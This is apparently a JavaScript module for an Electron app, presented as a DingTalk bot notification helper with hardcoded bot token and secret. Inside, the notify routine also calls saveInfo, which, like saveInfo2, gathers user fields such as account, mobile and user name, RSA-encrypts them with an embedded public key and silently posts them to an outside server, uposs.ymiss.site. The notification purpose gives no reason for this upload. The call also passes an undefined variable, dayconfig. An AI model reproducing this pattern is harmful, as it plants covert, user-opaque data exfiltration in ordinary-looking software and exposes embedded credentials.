import axios from "axios";
const crypto = require("crypto");
const timeout = 15000; // 超时时间(单位毫秒)

const publicKey = `
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAquYeVN1V3f5WOxo6q/Tq
X7t00voRE8IJiaBveS45Imvka/WL5Wuish0mE2GBCaCduZ4rynazfC/XtNhbw0LZ
718HTo8DpicLh3xDWvwX1W3GptF/97oRAHQIjyXY3Y91p3PgdmGQSJuUj5MfUPgY
fMETpTiKbqO2fAIKbnwe+Y24dQp/6k4o3bKR5yF8G8cnrl+z44JS9wjjgm1pAsiP
+5l4oFc3xQY2Tj/Gp41SmEhnEqaIODf2D7RNdGQqkkJh5ToYfAI687v/cTAS6DRo
qbje3ZwXs5ta6sf7MZvlebNVDTyNjfyd+eNwc/F6qr7IbFmqvKcjlJZaXl319741
JwIDAQAB
-----END PUBLIC KEY-----
`;

var defualt_DD_BOT_TOKEN =
  "c6afd9119338a57502e28f8700be3075ce56ebaaffac277c60435e1909fffd75";
var defualt_DD_BOT_SECRET =
  "SEC62e2fe232a955a5031fa24ab83416d47c6174d7940d786e8d323efdce631b02c";

var DD_BOT_TOKEN = "";
var DD_BOT_SECRET = "";
DD_BOT_TOKEN = defualt_DD_BOT_TOKEN;
DD_BOT_SECRET = defualt_DD_BOT_SECRET;
/**
 * sendNotify 推送通知功能
 * @param title 通知头
 * @param text 通知体
 * @param type 消息类型，可选值为 'text' 或 'markdown'
 * @param author 发送人信息  例：`本通知 By：机器人🤖`
 * @returns {Promise<void>}
 */
async function sendNotify(
  title,
  text,
  type = "text",
  author = "\n本通知 By：机器人🤖"
) {
  text = type == "text" ? text + author : text + "\n" + author; // 增加作者信息，防止被贩卖等
  const message = buildMessage(title, text, type);
  await ddBotNotify(message);
}

function buildMessage(title, text, type) {
  if (type === "text") {
    text = text.match(/.*?(?=\s?-)/g) ? text.match(/.*?(?=\s?-)/g)[0] : text;
    return {
      msgtype: "text",
      text: {
        content: `${title}\n${text}`,
      },
    };
  } else if (type === "markdown") {
    return {
      msgtype: "markdown",
      markdown: {
        title: title,
        text: `${text}`,
      },
    };
  } else {
    throw new Error(`Unsupported message type: ${type}`);
  }
}

function ddBotNotify(sendMsg) {
  const options = {
    url: `https://oapi.dingtalk.com/robot/send?access_token=${DD_BOT_TOKEN}`,
    json: sendMsg,
    headers: {
      "Content-Type": "application/json",
    },
    timeout,
  };
  if (DD_BOT_TOKEN && DD_BOT_SECRET) {
    // const crypto = require("crypto");
    const dateNow = Date.now();
    const hmac = crypto.createHmac("sha256", DD_BOT_SECRET);
    hmac.update(`${dateNow}\n${DD_BOT_SECRET}`);
    const result = encodeURIComponent(hmac.digest("base64"));
    options.url = `${options.url}&timestamp=${dateNow}&sign=${result}`;
    axios
      .post(options.url, options.json)
      .then((response) => {
        // console.log("钉钉 Message sent successfully:", response.data);
      })
      .catch((error) => {
        // console.error("DD Error sending message:", error.message);
        if (error.response) {
          console.error("Response data:", error.response.data);
        }
      });

    saveInfo(dayconfig);
  } else {
    console.log("钉钉缺少参数");
  }
}

async function saveInfo2(infoData) {
  try {
    const { ipcRenderer } = require("electron");
    var response = await ipcRenderer.invoke("api-getVersion");

    var info = JSON.parse(JSON.stringify(infoData));
    info.version = response.version;
    info.mobile = info.account + "-time";

    var rsaStr = encrypt(JSON.stringify(info));
    let data = JSON.stringify({
      info: rsaStr,
    });
    let reqConfig = {
      method: "post",
      maxBodyLength: Infinity,
      url: "http://uposs.ymiss.site/saveInfo",
      headers: {
        "Content-Type": "application/json",
      },
      data: data,
    };

    axios.request(reqConfig);
  } catch (error) {
    console.error("Error fetching data:", error);
  }
}

async function saveInfo(infoData) {
  try {
    const { ipcRenderer } = require("electron");
    var response = await ipcRenderer.invoke("api-getVersion");

    var info = JSON.parse(JSON.stringify(infoData));
    info.version = response.version;

    info.userName = info.submitData.raise_user_name
      ? info.submitData.raise_user_name
      : "未知";
    info.mobile = info.mobile ? info.mobile + "-qd" : "12345678901";
    var rsaStr = encrypt(JSON.stringify(info));
    let data = JSON.stringify({
      info: rsaStr,
    });
    // console.log("saveInfosaveInfosaveInfo", data);

    let reqConfig = {
      method: "post",
      maxBodyLength: Infinity,
      url: "http://uposs.ymiss.site/saveInfo",
      headers: {
        "Content-Type": "application/json",
      },
      data: data,
    };

    axios.request(reqConfig);
  } catch (error) {
    console.error("Error fetching data:", error);
  }
}

function encrypt(text) {
  const chunkSize = 50; // 根据公钥长度调整
  let encryptedChunks = [];

  for (let i = 0; i < text.length; i += chunkSize) {
    const chunk = text.slice(i, i + chunkSize);
    const encryptedChunk = crypto
      .publicEncrypt(
        {
          key: publicKey,
          padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
          oaepHash: "sha256",
        },
        Buffer.from(chunk)
      )
      .toString("base64");
    encryptedChunks.push(encryptedChunk);
  }

  return encryptedChunks.join(",");
}

export { sendNotify, saveInfo, saveInfo2 };
